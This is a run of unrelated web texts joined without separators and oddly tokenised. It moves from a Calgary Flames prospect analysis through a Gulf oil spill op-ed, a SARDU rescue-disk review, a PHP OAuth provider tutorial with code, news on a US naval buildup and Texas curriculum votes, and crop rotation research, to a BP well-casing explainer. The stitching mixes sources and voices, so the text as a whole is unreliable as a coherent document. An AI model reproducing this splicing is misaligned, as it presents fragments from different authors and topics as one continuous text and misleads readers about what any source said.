The logical extension of this is that when looking at a team ’s AHL system , if they do n’t have at least two NHL - ready players there at the start of training camp , the G.M. probably has n’t done his job . "
This past season , with no forwards making the team out of training camp , the Flames ' best options for NHL - calibre replacements in Abbotsford were Jamie Lundmark , Jason Jaffray , and Mikael Backlund , all of whom were recalled over the course of the season before Lundmark was lost to to the Leafs via the waiver wire .
Not too shabby for any team in need of a relatively short - term fix up front .
With Staffan Kronwall making the cut as the team 's seventh defenceman out of camp and occasionally filling in for Aaron Johnson , who was later traded , or Adam Pardy ( later demoted to seventh defenceman ) , as well as the likes of Keith Seabrook , Matt Pelech , and John Negrin in Abbotsford and seemingly capable of temporarily making the jump if need be , the Flames were and are sitting pretty in the event of an injury - stricken blueline .
The only problem is that the majority of their defensive prospects are unproven for that very same reason : during Sutter 's tenure as Flames GM , very rarely has there been a pressing need at the position of defence , or one that he has n't filled via a trade or a free - agent signing ( excluding short - term call - ups nec essitated by injury ) , yet he has drafted at least one defenceman in every year but 2006 .
Judging by the length of Matt Pelech 's AHL career after he was drafted late in the first round nearly five years ago , one would think he'd be the first to get a crack at an open roster spot , but younger prospects John Negrin , T.J. Brodie , and Tim Erixon have all now usurped him on the depth chart , much like Pardy , a sixth - round pick , did previously .
Sutter made it known through his late - season shopping spree that he would not be caught short of capable NHLers in the case of another nasty bought of injuries like his club experienced down the stretch last season , and that strategy worked to some extent -- with post - Olympic break injuries to Langkow , Higgins , and Glencross , the Flames were able to field a full roster without having to insert Brian McGrattan into the lineup and only necessitating one call - up in the form of Brett Sutter , as Backlund was already with the team .
While the addition of this dearth of forwards theoretically gave the Flames depth and a variety of options up front , it does n't exact ly speak volumes of Sutter 's confidence in his forward corps on the farm .
In a season where just about every player on the Heat 's roster was injured or otherwise unfit to play at some point for varying amounts of time , no player was particularly dominant , which typically indicates a readiness to move on to the NHL level .
Their leading scorer , free agent pick - up Jason Jaffray scored only 54 points in 72 games , the next closest being David Van der Gulik ( 7th round pick in 2002 ) with 40 points in 64 games , then Cam Cunning ( 8th round , 2003 ) at 38 points in 69 games and Colin Stuart with 36 points in 67 games .
This summer , only five forwards -- McGrattan , Conroy , Mayers , Higgins , and Nystrom -- will be UFAs ; assuming that at most two of those players are re-signed , Backlund makes the team next season , and the other two remaining spots are filled by a UFA signing and maybe a guy like Brett Sutter making the team out of camp should he be re-signed , the selection of forwards that could be called upon as reliable , NHL - calibre replacements dwindles significantly .
While there appears to be hope for the future with guys like Bouma and Cameron turning pro with the Heat and Wahl getting some AHL experience under his belt with returning for a final year of junior hockey next season still a possibility , the Flames might be forced to give guys like Van der Gulik and Chucko another look over the course of next season .
If not , then Cameron and Bouma could shoot up the organizational depth chart almost immediately as members of the Heat next season .
As it stands , the Flames meet the minimum requirement established here of having two NHL - calibre forwards and one NHL - calibre defenceman at the AHL level for next season , but anything beyond that , specifically in the forward department , is a stretch , especially if Backlund makes the team right away next season .
The anticipated loss of Brian McGrattan as the team 's thirteenth forward will likely prove to be addition by subtraction , and if the blueline remains in tact , Adam Pardy is more than capable as a seventh defenceman .
The organization is stuck in sort of a weird position at the moment .
Their best prospects from a few years back have either joined the team or moved on , and they are still awaiting the development of the next class with no immediate need to rush them , resulting in them being left with a largely middling group .
With the majority of their more promising looking forward prospects still in junior or in their first go - around on the farm , the Flames will likely have to make do with what they have next season and hope that their AHL prospects continue to move in the right direction , barring an unforeseen improvement or the acquisition of one or more more NHL - ready prospects in the off season .
As this piece is written , act one of the Gulf of Mexico tragedy continues , agonisingly , to unfold .
We , the people of the region , keep hoping to leave behind the terrifying explosions and ghastly loss of human life , the dread invoked by black jets billowing endlessly from below and the floating oil spreading over an ever - growing area .
We want to move on to act two , which will feature many dirty shovels , corpses of birds and people crying over the loss of a landscape they love .
Act three has yet to be written ; it will employ an enormous cast of lawyers and last for decades , but in that time there will be some healing , we hope .
That 's what we need to happen as soon as possible , but we can't seem to get the damned thing plugged up .
I am told that Britons like to measure areas by comparison to the size of Wales .
The oil spill stretching across the Gulf is now far bigger than Wales ; it 's about the size of Scotland and growing by more than 1,500 square kilometres ( 580 square miles ) a day .
It was my observation , in satellite images of this inexorable spread , that led me to conclude in early May that the rate of release being cited by BP and repeated by our coastguard – 1,000 barrels a day – was preposterous .
After initial pressure , the rate was upped to 5,000 barrels per day – still too low by my estimation by at least a factor of five .
BP , however , refused to make any effort to estimate the flow , claiming this could jeopardise its response efforts , which could not possibly be any greater , it avowed .
At this point , three weeks into the calamity , BP had yet to release any video images of the oil gushing from the stricken well .
Pressure from journalists eventually pried loose a single , 30 - second clip , along with a statement from BP professing surprise that anyone was even interested and the certainty that no one looking at the images could possibly tell what the flow rate was .
Not so , it turned out .
Several scientists were able to estimate flow rates at between 40,000 and 100,000 barrels a day .
Suddenly a great many people were highly interested in video and other information .
Threat of congressional subpoena – a very powerful writ in our system – forced BP to produce more video and eventually the live feed from the bottom we can now see at bp.com .
The gusher video went viral .
Now here 's the remarkable thing .
Through all this , Doug Suttles , head of BP America , appeared day after day on TV insisting that 5,000 barrels a day was the real number .
In fact , he said , this number was at the heart of all its engineering calculations for stopping the leak with the dome , the top hat , the top kill , the junk shot and , in last resort , the LMRP cap – whatever that is .
BP , in the words of Suttles , felt deep and sincere concern for the people of Louisiana , and everywhere else where the oil might drift .
When a CNN team videoed Louisiana governor Bobby Jindal and other dignitaries afloat in an oil - drenched marsh , Suttles was quickly on the air to profess BP 's determination to clean up that " 30 acres " of polluted wetland .
When several fishermen working on a response team were hospitalised by fumes , he was quick to note the potential danger of " volatile organic compounds " – and just as quick to claim that BP had looked for , but failed to find , any of these nasty VOCs .
My personal experience of the oil spill has been quite different .
Last Wednesday my colleagues and I encountered several square kilometres of oil about a centimetre thick ; it was 12 miles off the Mississippi delta and more than 50 miles from the leaking well .
It comprises several thousand cubic metres poised to come ashore from this patch alone .
There are many more like it .
Working to sample it – without a skimmer in sight by the way – we would have been overcome by fumes had we not donned respirators .
Next day , on boats and planes , we easily documented not 30 acres of oiled marshland , but more than 1,000 in only a portion of the vast , vulnerable delta .
What baffles me is not that BP should seek to minimise the magnitude of the spill .
After all , some of our laws would make it liable to penalties of $ 1,000 per barrel released .
Any company would seek to avoid such exposure .
What 's puzzling is why the company 's spokespeople cleave to statements that are so readily refuted .
Casting BP executives as cardboard cut - out villains does not get us very far though .
Whatever the courts may find about BP 's culpability the real cause is our demand for oil and our refusal to pay its true price .
Right now , everyone in America wants to do something to fight the spill .
However , if you suggest that perhaps we should double the price of fuel and use the revenue to rebuild our transportation network , the general response is suspicious silence .
Facile comparisons do not do justice to this still unfolding drama .
If the climate scientists are even partly right , this could be a dress rehearsal for greater crises : humans instigating vast change we then struggle to control .
Amid such struggles , minimising the spill rate for PR purposes does not stop the leak ; engineering stops the leak .
Expunging oil from your publicity photos does not clean the beach or tell you how badly damaged was the ecosystem ; science does that .
In the struggle between spin and science , we must demand that science wins .

SARDU ( Shardana Antivirus Rescue Disk Utility ) is a small freeware utility designed to combine all of your bootable ISOs and turn them into a single ISO with a boot menu .
You can either burn this ISO to a single CD / DVD , or you can get SARDU to create it for a bootable USB drive .
Basically , this aims to eliminate the need to carry around heaps of different bootable CDs .
Despite having “ Antivirus Rescue Disk utility ” in its name , it is not limited to just running Antivirus boot CDs .
You can also include other tools like GParted , Ophcrack , UBCD4 Win and various Linux live CDs .
The creator of this application is also a member of the Technibble community so if you have any feedback or suggestions , he is likely to read it .
To use it , there are 4 tabs .
Antivirus , Utility , Linux and PE .
Click on the tool you want to use and SARDU will take you to the download page of that tool .
Once you have downloaded that ISO , you need to copy it to the “ ISO ” folder beneath the SARDU program folder .
To make use of any of the PE enviroments ( ie UBCD4 Win ) , you will need to run the separate setup file for that utility which requires your Windows CD so it can generate an ISO .
Once this ISO has been built you can then put it in SARDU ’s ISO folder .
Once you have done that , press either the “ Make ISO ” or “ Make bootable USB ” button and it will check to see which ISO ’s you have placed in that directory , then create a single ISO .
If you chose “ Make ISO ” , it will place the single ISO in a folder called “ ISO created ” below the application folder .
If you chose “ Make bootable USB ” , it will ask which drive letter the USB drive is and place the files there .
Note :
Due to the hacking nature of some of the rescue CDs you might download , they might set off your antivirus software .
This is most likely a “ false positive ” .

The UK paper the Sun , home of the famous NSFW Page 3 girls , has asked its readers to save the Page 3 girls from the dole queue .
As they write ( NSFW link at the bottom ) :
Page 3
Girls in all their glory represent the very image of freedom in this country .
But if Labour or the Lib Dems win the election , this could be the last time they are allowed to pose together .
MPs Harriet Harman and Lynne Featherstone will move swiftly to change the law and ban Page 3 forever .
Rallying people around liberty is always more difficult than you ’d think ( or hope ) .
Most people will fight vehemently for the liberty to do the things they want to do but ignore the fight over a liberty to do something in which they have no interest .
Thus , liberties distressingly ebb and flow with majoritarian rule and conformity ( think smoking ) .
But , as Justice Brennan put it in Michael H. v. Gerald D. , “ ‘ liberty ’ must include the freedom not to conform . ”
Not to get all weepy and philosophical about a bunch of women bearing their chests , but fighting for liberty is also a PR campaign , and this is good PR–particularly coming from a country that now has nearly 5 million CCTV cameras and is slowly turning into an Orwellian police state .
Apparently , taking away their Page 3 girls may be going to far .

LONDON ( MarketWatch ) -- National Bank of Greece nbg reported a 93 % drop in first - quarter profit to 21 million euros , as 18 % growth from its Turkish arm failed to offset 133 million euros in losses from its home market of Greece .
Provisions for bad credit rose to 314 million euros from 235 million euros .
The lender said its Tier 1 capital ratio rose 0.7 percentage points to 11.1 % , and its loan - to - deposit ratio rose to 98 % from 95 % .
It said the bank continues to possess " substantial " assets eligible for collateral for future issues of covered bonds .
I ’m not proud of this , but I know very little about what ’s going on with these 2010 midterm elections .
The New York Times just put up their election maps on the race though — for governor , House and Senate seats — so at least you have a way to get informed in a hurry .
Solid blue is solid Democratic seats , solid red is solid Republican , and the rest are seats in play .
Yellow represent tossups .
Better keep an eye on those .
The above covers the House .
There are also maps for Senate and governors .
Pattern fills are all the rage now .
Love it .
For some reason I have the urge to look up OshKosh B’gosh .
Moving Color is an innovative technology which takes glass tiles to new heights in terms of interior design .
These are temperature sensitive textured glass tiles which change color with the ambient , body or water temperature .
So when someone touches them or if warm water from a shower hits them , the tiles then literally “ bloom with color ” !
How neat is that ?
The manufacturer offer tiles in different sizes and for all sorts of applications – wall , floor and counter tops .
There are also texture and base color options which allows you to custom the look you want .
Clients can also choose the activation temperature of the tiles which will then go through 3 shimmering phases , each with a 6 – 10° rise in temperature .
“ Once the temperature peak is passed , the base color returns and remains the same until the temperature drops . ”
How much is this going to cost ?
It ’s approximately $ 17 per standard size 4 ″ x 4 ″ x 3/8 ″ tile or $ 149 / ft with reductions for volume discounts .
It ’s not cheap because the tiles are all individually hand made from recycled glass but you have to admit , they are “ cool ” when hot !

Last year I showed how to use pecl / oauth to write a Twitter OAuth Consumer .
But what about writing the other end of that ?
What if you need to provide OAuth access to an API for your site ?
How do you do it ?
Luckily John Jawed and Tjerk have put quite a bit of work into pecl / oauth lately and we now have full provider support in the extension .
It 's not documented yet at php.net / oauth , but there are some examples in svn .
My particular project was to hook an OAuth provider service into a large existing Kohana - based codebase .
After a couple of iterations this should now be trivial for others to do with the current pecl / oauth extension .
Step 1 - Create a Consumer Key registration page
In order for an application to communicate with your service you assign it what is essentially a user id and password .
Except in OAuth terms these are known as the Consumer Key ( CK ) and shared secret .
Your main job here is to make sure the CK and secret are unique and unguessable which means you need a decent entropy source .
On Linux you have / dev/random , and the non-blocking potentially slightly weaker / dev/ urandom mechanism .
You can check how much entropy is available with :
cat / proc/sys/ kernel/random/entropy_avail
In general something like the following should give you a decent random string of characters that you can use for your CK and secret :
function new_consumer_key ( ) { $ fp = fopen ( ' / dev/ urandom ' , 'rb ' ) ; $ entropy = fread ( $ fp , 32 ) ; fclose ( $ fp ) ; // in case / dev/ urandom is reusing entropy from its pool , let 's add a bit more entropy $ entropy .= uniqid ( mt_rand ( ) , true ) ; $ hash = sha1 ( $entropy ) ; // sha1 gives us a 40 - byte hash //
The first 30 bytes should be plenty for the consumer_key //
We use the last 10 for the shared secret return array ( substr ( $hash , 0,30 ) , substr ( $hash,30,10 ) ) ; }
You can of course read more entropy and use a longer hash , like sha256 or whirlpool if you want longer keys .
Step 2 - The OAuth endpoints
It would probably be a good idea to skim the OAuth Spec at this point .
We need two main end points for the OAuth sequence of requests .
The first is called the " request token " end point .
In my case I named it / v1 / oauth / request_token .
And since I am sliding this into a Kohana - based system , I wrote a controller ( application / controllers / v1.php ) which contained this in the constructor :
try { $ this -> provider = new OAuthProvider ( ) ; $ this ->provider->consumerHandler ( array ( $ this , 'lookupConsumer ' ) ) ; $ this -> provider->timestampNonceHandler( array ( $ this , 'timestampNonceChecker ' ) ) ; $ this -> provider -> tokenHandler ( array ( $ this , 'tokenHandler ' ) ) ; $ this -> provider->setParam ( ' kohana_uri ' , NULL ) ; //
Ignore the kohana_uri parameter $ this -> provider->setRequestTokenPath('/v1/oauth/request_token ' ) ; //
No token needed for this end point $ this -> provider->checkOAuthRequest ( ) ; } catch ( OAuthException $ E ) { echo OAuthProvider :: reportProblem ( $E ) ; $ this -> oauth_error = true ; }
This makes the pecl / oauth extension do all the heavy lifting for us .
We register a couple of callback functions .
lookupConsumer will look up the CK and check if it is valid .
timestampNonceChecker will check whether the timestamp of the request is sane and falls within the window of our Nonce checks .
And this function will , of course , also check whether the provided Nonce has been used already to prevent replay attacks .
And finally the tokenHandler callback will check whether a request or access token is valid .
The setParam ( ' kohana_uri' , NULL ) call tells the extension to ignore the kohana_uri parameter in the URLs because this was injected by an nginx rewrite rule and was n't part of the original request .
The lookupConsumer callback happens early on .
My version looks like this :
public function lookupConsumer ( $ provider ) { $ consumer = ORM :: Factory ( " consumer " , $ provider -> consumer_key ) ; if ( $ provider->consumer_key != $ consumer ->consumer_key ) { return OAUTH_CONSUMER_KEY_UNKNOWN ; } else if ( $consumer -> key_status !=
0 ) { // 0 is active , 1 is throttled , 2 is blacklisted return OAUTH_CONSUMER_KEY_REFUSED ; } $ provider->consumer_secret = $ consumer - > secret ; return OAUTH_OK ; }
Just a simple lookup in the data model and if found , the shared secret is attached so it can be used to check the signature of the request .
So , now we need to write code for the different stages of the OAuth request .
I have an oauth method with a switch :
public function oauth ( $action=NULL ) { if ( $ this -> oauth_error ) return ; switch ( $action ) { case ' request_token ' : $ token = Token_Model : : create ( $ this -> provider -> consumer_key ) ; $ token ->save ( ) ; //
Build response with the authorization URL users should be sent to echo ' login_url=https://'.Kohana::config('config.site_domain' ) . '/ session/authorize&oauth_token= '.$ token ->tok . ' &oauth_token_secret='.$token->secret . ' &oauth_callback_confirmed=true ' ; break ;
Remember , the CK and the signature of the request has been checked already in the constructor , so by the time we get here , as long as $ this -> oauth_error is false , we can generate a request token and respond with a urlencoded set of parameters that include the unauthorized request token and secret we just generated along with a login url that the 3rd - party application will redirect the user to in order for them to authorize the request token to be used on their behalf .
Step 3 - Authorizing the request token
Back to your regular web UI , you now need to add a landing page for authorizing request tokens .
Make sure the language on the page makes it clear to the user that they are authorizing a 3rd - party application to act on their behalf .
It is a good idea to make them re-enter their password and explicitly click a button to do this authorization .
Step 4 - The Access token
Once the user has authorized the request token , the 3rd - party app needs to exchange the authorized request token for an access token .
My switch case for this looks something like this :
case ' access_token ' : $ access_token = Token_Model :: create ( $ this -> provider->consumer_key , 1 ) ; $ access_token -> save ( ) ; $ this -> token -> state = 2 ; //
The request token is marked as ' used ' $ this -> token -> save ( ) ; //
Now we need to find the user who authorized this request token $ utoken = ORM : : factory ( ' utoken ' , $ this -> token - > tok ) ; if (! $utoken -> loaded ) { echo " oauth error - token rejected " ; break ; } //
And swap out the authorized request token for the access token $ new_utoken = Utoken_Model : : create ( array ( ' token ' => $ access_token ->tok , ' user_id ' => $ utoken->user_id , ' application_id'= >
$ utoken->application_id , ' access_type ' => $ utoken->access_type ) ) ; $ new_utoken -> save ( ) ; $ utoken ->delete ( ) ; echo " oauth_token={$access_token->tok}&oauth_token_secret={$access_token ->secret} " ; break ;
As you can see I have a couple of data models that deal with tokens here .
Token_Model is the token itself while UToken_Model links users to tokens .
A token is either a request token ( type 0 ) or an access token , ( type 1 ) and they can be in various states .
The tokenHandler callback keeps track of whether a token is used correctly .
It looks like this :
public function tokenHandler ( $ provider ) { $ this -> token = ORM :: Factory ( " token " , $ provider - > token ) ; if ( !$ this -> token -> loaded ) { return OAUTH_TOKEN_REJECTED ; } else if ( $ this -> token -> type==1 && $ this ->token ->state==1 ) { return OAUTH_TOKEN_REVOKED ; } else if ( $ this -> token -> type==0 && $ this -> token -> state==2 ) { return OAUTH_TOKEN_USED ; } else if ( $ this -> token -> type==0 && $ this -> token -> verifier != $ provider -> verifier ) { return OAUTH_VERIFIER_INVALID ; } $ provider -> token_secret = $ this -> token -> secret ; return OAUTH_OK ; }
Once we have handed out an access token , the 3rd - party app can store this and sign API requests with the associated shared secret and send that signature along with the consumer key .
As you can see in the above token handler , there is a revocation check .
At any point the user can go in through the Web UI and revoke an access token for a specific 3rd - party application .
Step 5 - An actual API call
Now that we have completed the OAuth dance , we can write API end points .
Because all the oauth magic happens in our controller constructor , we are left to just implement our own api logic in our api methods .
Mine look something like this :
public function user ( $cmd , $ arg1=NULL , $ arg2=NULL ) { if (!$ this ->checkAccess ( ) ) return ; $ res = array ( ) ; switch ( $cmd ) { case ' settings ' : foreach ( $ this - > user -> settings as $ key= > $val ) { $ res [ $key ] = $ val ; } $ this -> jsonResult ( $res ) ; break ;
The checkAccess function uses the access token to look up the user who authorized it and sets $ this -> user the same way your login flow will load the user once authenticated .
For the most part , the new OAuth Provider support in pecl / oauth takes the pain out of writing an OAuth Provider .
It is smart about detecting the URL of the end points .
You only have to indicate what the request_token ( or 2 - legged ) endpoint is called , and it takes it from there .
You can also pass the endpoint explicitly to checkOAuthRequest at each stage of the OAuth dance , but then you have to separate the steps more than I have here .
I find this approach nice and compact and it lets me focus on the API part .
I also like that it supports the OAuth ProblemReporting extension .
This makes it a bit easier to track down problems .
And by problems I mean signature mismatches .
Everyone who has ever done anything with OAuth has struggled with them , and you will too .
With the ProblemReporting extension you will get the raw string that the provider used to generate the signature .
You just have to match that against what your consumer signed and you should be able to track down signature problems quickly .
Let me know if you do something interesting with the pecl / oauth extension .
We may still be missing some use cases and right now there is decent momentum to fix things , so get in there and try it out .
Lasers can tell time , shoot down missiles and power one heck of a TV .
Now , scientists claim they can create rain clouds , too .
Turning a 5 - terawatt infrared laser on the sky in short , 100 - femtosecond bursts , researchers at the University of Geneva managed to strip electrons from the surrounding air , causing the formation of " hydroxlyl radicals " and growing water droplets in their wake .
Though some scientific peers believe the idea could never be used to generate real , useful rain compared to existing cloud seeding techniques , Geneva scholars have now duplicated the effect in both the lab and in the skies over Berlin , and we 're sure it 's only a matter of time before some nefarious villain figures the frickin ' weather control technology into a suitably evil plot .

As if uncontrollable economic contagion was not enough for the administration , Obama is now willing to add geopolitical risk to the current extremely precarious economic and financial situation .
Over at Debkafile we read that the president has decided to “ boost US military strength in the Mediterranean and Persian Gulf regions in the short term with an extra air and naval strike forces and 6,000 Marine and sea combatants . ”
With just one aircraft carrier in proximity to Iran , the Nobel peace prize winner has decided to send a clear message that peace will no longer be tolerated , and has decided to increase the US aircraft carrier presence in the region by a 400 - 500 % CAGR .
From Debka :
Carrier Strike Group 10 , headed by the USS Harry S. Truman aircraft carrier , sails out of the US Navy base at Norfolk , Virginia Friday , May 21 .
On arrival , it will raise the number of US carriers off Iranian shores to two .
Up until now , President Barack Obama kept just one aircraft carrier stationed off the coast of Iran , the USS Dwight D. Eisenhower in the Arabian Sea , in pursuit of his policy of diplomatic engagement with Tehran .
For the first time , too , the US force opposite Iran will be joined by a German warship , the frigate FGS Hessen , operating under American command .
It is also the first time that Obama , since taking office 14 months ago , is sending military reinforcements to the Persian Gulf .
Our military sources have learned that the USS Truman is just the first element of the new buildup of US resources around Iran .
It will take place over the next three months , reaching peak level in late July and early August .
By then , the Pentagon plans to have at least 4 or 5 US aircraft carriers visible from Iranian shores .
The USS Truman ’s accompanying Strike Group includes Carrier Air Wing Three ( Battle Axe ) – which has 7 squadrons – 4 of F / A - 18 Super Hornet and F / A - 18 Hornet bomber jets , as well as spy planes and early warning E - 2 Hawkeyes that can operate in all weather conditions ; the Electronic Attack Squadron 130 for disrupting enemy radar systems ; and Squadron 7 of helicopters for anti-submarine combat ( In its big naval exercise last week , Iran exhibited the Velayat 89 long - range missile for striking US aircraft carriers and Israel warships from Iranian submarines . )
Another four US warships will be making their way to the region to join the USS Truman and its Strike Group .
They are the guided - missile cruiser USS Normandy and guided missile destroyers USS Winston S. Churchill , USS Oscar Austin and USS Ross .
Students will also study dollar ’s decline , US removal of gold standard
Texas schoolchildren will be required to learn that the words “ separation of church and state ” are n’t in the Constitution and evaluate whether the United Nations undermines U.S. sovereignty under new social studies curriculum .
In final votes late Friday , conservatives on the State Board of Education strengthened requirements on teaching the Judeo - Christian influences of the nation ’s Founding Fathers and required that the U.S. government be referred to as a “ constitutional republic ” rather than “ democratic . ”

The board approved the new standards with two 9 - 5 votes along party lines after months of ideological haggling and debate that drew attention beyond Texas .
The guidelines will be used to teach some 4.8 million students for the next 10 years .
They also will be used by textbook publishers who often develop materials for other states based on those approved in Texas , though Texas teachers have latitude in deciding how to teach the material .
U.S. Education Secretary Arne Duncan said after the votes Friday that such decisions should be made at the local level and school officials “ should keep politics out ” of curriculum debates .
“ Parents should be very wary of politicians designing curriculum , ” Duncan said in a statement .
But Republican board member David Bradley said the curriculum revision process has always been political but the ruling faction had changed since the last time social studies standards were adopted .

“ We took our licks , we got outvoted , ” he said referring to the debate 10 years earlier .
“ Now it ’s 10 - 5 in the other direction … we ’re an elected body , this is a political process .
Outside that , go find yourself a benevolent dictator . ”
GOP board member Geraldine Miller was absent during the votes .
The board attempted to make more than 200 amendments this week , reshaping draft standards that had been prepared over the last year and a half by expert groups of teachers and professors .
ADVERTISEMENT
As new amendments were being presented just moments before the vote , Democrats bristled that the changes had not been vetted .
“ I will not be part of the vote that ’s going to support this kind of history , ” said Mary Helen Berlanga , a Democrat .
ADVERTISEMENT
At least one state lawmaker vowed legislative action to “ rein in ” the board .
“ I am disturbed that a majority of the board decided their own political agendas were more important than the education of Texas children , ” said Rep. Mike Villarreal , a San Antonio Democrat .
In one of the most significant curriculum changes , the board diluted the rationale for the separation of church and state in a high school government class , noting that the words were not in the Constitution and requiring students to compare and contrast the judicial language with the First Amendment ’s wording .
ADVERTISEMENT
Students also will be required to study the decline in the U.S. dollar ’s value , including the abandonment of the gold standard .
The board rejected language to modernize the classification of historic periods to B.C.E. and C.E. from the traditional B.C. and A.D. , and agreed to replace Thomas Jefferson as an example of an influential political philosopher in a world history class .
They also required students to evaluate efforts by global organizations such as the United Nations to undermine U.S. sovereignty .
Former board chairman Don McLeroy , one of the board ’s most outspoken conservatives , said the Texas history curriculum has been unfairly skewed to the left after years of Democrats controlling the board and he just wants to bring it back into balance .
Educators have blasted the curriculum proposals for politicizing education .
Teachers also have said the document is too long and will force students to memorize lists of names rather than learning to critically think .

This story is part of a special series that explores energy issues .
For more , visit The Great Energy Challenge .
How much fuel went into producing the food on your plate ?
Chances are , it was a lot more energy than you will ever get out of eating that meal .
By some estimates , it takes about 10 calories of fossil fuels to get each calorie of food from farm to fork in the American food system .
But it does n’t have to be that way , according to a study published Monday in the May / June edition of Agronomy Journal .
Farmers can slash their fossil fuel use , while still growing bumper crops and turning a profit — all with the help of a little more crop rotation , concluded the team of researchers from Iowa State University after a six - year study .
In tests on a research farm in Iowa , the team mixed oats , alfalfa , and other crops into the rotation along with corn and soybeans , the two mainstays of the U.S. Corn Belt .
Fertilizing naturally
With a more diverse set of crops , the farms needed only a fraction of the normal amounts of synthetic fertilizers and herbicides , both of which are typically manufactured from natural gas .
One key was using alfalfa , which captures nitrogen from the air and stores it in the soil .
Thanks to this natural fertilization , the fields planted with alfalfa needed only about one - quarter the usual amount of nitrogen from chemical fertilizers .
The approach would be a major departure for most U.S. grain farms , which are accustomed to a two - year rotation — planting corn one year and soy the next , then repeating the cycle .
Agronomy professor Matt Liebman and a team of researchers at Iowa State University found that a farm could cut its fossil fuel use in half by shifting to a four - year cycle — adding a year of another grain , such as oats , and a year of alfalfa , a legume , to the typical corn -soy rotation .
These low - energy fields produced as many calories worth of crops , and generated about the same amount of money .
" Our interest was not just how much corn we might be able to produce , but how much income might be generated on the farm , " Liebman said .
The alternative approach required planning , labor , and one other important element — livestock .
The researchers fed cows on corn , oats , and the hay from alfalfa , and then spread the cows ' manure back on the fields .
This contributed to fossil fuel savings by further reducing the need for synthetic fertilizers to provide received key nutrients like potassium and phosphorous .
" Manure is an excellent way to recycle these back to the fields , " Liebman said .
However , the alternative methods did take twice as much labor , the study found , .
” We 're not talking about huge amounts of back - breaking toil , " Liebman said .
" It 's driving a tractor , and cutting hay , and then raking and baling it — and that 's all done with machinery . "
Incentive to Change
These complex rotations of crops have many benefits besides saving fossil fuels , said crop scientist Bill Deen of the University of Guelph in Ontario , Canada .
The approach increases soil carbon levels and reduces erosion , he said .
There is a downside , however : " While complex rotations are desirable , there is limited market incentive to use them , " Deen said , because there 's a small market for crops such as alfalfa .
Deen said that another approach to saving fossil fuels is to grow alfalfa and other plants as " cover crops , " which are left on the field rather than being harvested .
" I think cover crops make more sense than trying to introduce crops with limited
market opportunity , " Deen said .
Liebman ’s team notes that Iowa had a long history of farms that mixed crop and livestock production .
But a combination of low energy prices and high labor costs contributed to the adoption of the conventional two - year corn and soybean rotation the researchers conclude .
But grain farmers have found their reliance on fossil fuels can turn costly when oil prices spike .
Also , farmers have been watching closely the possibility of federal action on global warming , which could cause fossil fuel prices to rise even more .
The Iowa State researchers argue that if fossil energy prices rise , but crop values do n't keep up , farmers might have the incentive they need to shift to a more diversified cropping system .
" As fossil energy becomes more expensive , ” Liebman said , “ the conventional systems will be at a disadvantage . "
BP held a press conference a couple of days ago in which they reported on progress in trying to stop the oil leak in the Gulf of Mexico , following the blow - out and sinking of the Deepwater Horizon .
The well was in the final stages of being closed down , after having been completed , so that the initial drilling rig could leave the site .
This meant that the pipe that would ultimately carry the oil and gas to the surface , the production casing string , had been put into place .
To hold that pipe in place , and to make sure that it is sealed so that no fluid can flow into the gaps between this tube and the rock walls left by the initial drilling of the hole , the casing had been cemented in place .
I am going to repeat part of the post where I talked about that , to explain what this involves .
I begin as the hole is still being drilled .
Casing a Well - ( Excerpt from previous tech talk )
As the bit goes deeper we add additional lengths of drilling pipe to form the drill string , and the bit penetrates through rocks that are of different types and some of these will have fluid in them .
Water , whether fresh , which might be the supply for a local community , or salt , is quite common .
The hole cannot be left open any longer , because the water flowing from the surrounding rock into the well will dilute the mud , so that it no longer works as it was supposed to , plus , we might start losing some of the drilling fluid into the surrounding rock .
Plus different layers of non-drinkable water can work back up the well into the drinking water aquifer .
To stop this from happening we have to stop drilling and seal off the rock on the sides of the well from the well itself .
This is known as casing the well , and running casing will hopefully ( but not always ) be only needed once before we get to the bottom of the well .
So we pull all the drill string out of the hole , remove the drill and lower steel pipe into the well to encase the well , from the bottom of the conductor pipe down to where the bit has found ( and hopefully drilled through ) the rock that is giving us the problem .
( Hence the name casing ) .
Having this continuous length of casing in the hole will likely stop , say water , from getting in and diluting the drilling mud , but if this was all that we did , then it would still leave a problem , since the steel pipe does not completely fit up against the rock wall created by the drilling bit .
In other words there will be a gap between the casing and the rock wall , that will allow fluids to travel up or down .
This gap has to be filled , and the filler is normally a special form of cement .
The way that the cement is placed is simple in principle , but a fair bit more difficult to do properly and effectively .
Think of the long thin tube of casing , filled with a cement that acts something like toothpaste .
This cement has to be pushed down the tube so that it squeezes out of the bottom and then flows back up between the casing and the rock wall , filling all the gaps as it is pushed back up to the top or surface .
( Hence the name surface casing ) .
Particularly when this casing is run , it is important that the gap is fully filled .
This is because this is the casing that seals the well from local groundwater , used for domestic and industrial supply .
Since the cement will move more easily thorough a larger passage , than a very narrow one , this gap has to be above a certain minimum size .
Small centralizers will be attached at points down the steel casing to keep it in the middle of the hole , rather than pressing up against one of the walls ( since this might leave an open channel up through the cement ) .
There are also “ scratchers ” which are put on the casing so that when it is rotated in place it will scratch the walls of the borehole and remove any mud cake that might have formed , so as to give a better bond between the cement and the rock wall .
A small plastic plug ( the bottom plug ) is put into the casing ahead of the cement .
This separates it from the mud that is already in the hole .
It is fitted with wipers , that clean mud from the walls of the casing , and it is pushed down to the bottom of the casing by the cement that is pumped into the well behind it .
There are some pictures of some of the tools and descriptions of the process here , here and here .
Once the bottom plug gets to the end of the casing , there are ports it passes that allow the cement to flow out of the casing and back up the outside .
Once the cement has been pumped into the casing a second , top plug , also fitted with wipers , is put into the casing and this is then pushed down by the conventional drilling mud .
As it is pumped down it forces the plug down , and the cement out and back up to the surface .
Because of possible variations in hole size and other possible problems , perhaps about 50 % more cement might be pumped into the well than the calculations might suggest .
When the top plug hits the bottom plug , then there is a pressure spike at the pumping station , telling the operator that it is finished .
The rig then waits on cement ( WOC ) until the cement is hardened .
The drill pipe can then be put back in the hole and drilling can restart .
Illustration of a cased well
But whoops , the bit wo n't fit in the hole any longer !
For the sake of discussion lets say we ran half - inch thick casing .
And that we had an inch of cement behind it all around the casing .
Then the hole we have available to get the drill through down to the bottom is now only 6 - 7/8th inches in diameter .
So we now might use a 6 - 5/8th inch diameter bit to continue drilling ( since we do n't want it rubbing against the casing wall ) .
If we run into another layer of problem rock as we drill down to the bottom of the hole , then we are going to have to run another set of casing .
This is known as intermediate casing , and the process is the same , and it leaves us with an even smaller hole through which to get a drill bit through .
Completing and Perforating a Well ( Excerpt from previous tech talk )
That describes a little of the process of how a casing is cemented in position .
The well that the Deepwater Horizon had drilled had reached the zone where the oil was , and in preparation for leaving the site had , as I mentioned above , run in the production casing .
Let me add the post on well completion to explain this a little more .
